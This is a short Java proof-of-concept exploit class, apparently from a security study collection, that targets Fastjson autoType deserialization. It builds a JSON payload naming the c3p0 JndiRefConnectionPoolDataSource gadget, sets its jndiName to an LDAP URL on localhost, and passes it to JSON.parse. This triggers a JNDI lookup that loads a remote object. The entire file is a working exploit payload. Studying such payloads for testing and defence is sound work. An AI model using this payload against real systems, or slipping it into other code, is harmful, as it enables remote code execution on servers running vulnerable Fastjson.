package JNDIVul;

import com.alibaba.fastjson.JSON;

public class JndiRefConnectionPoolDataSourceEXP {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\"," +
                "\"jndiName\":\"ldap://127.0.0.1:1230/remoteObject\",\"LoginTimeout\":\"1\"}";
        JSON.parse(payload);
    }
}
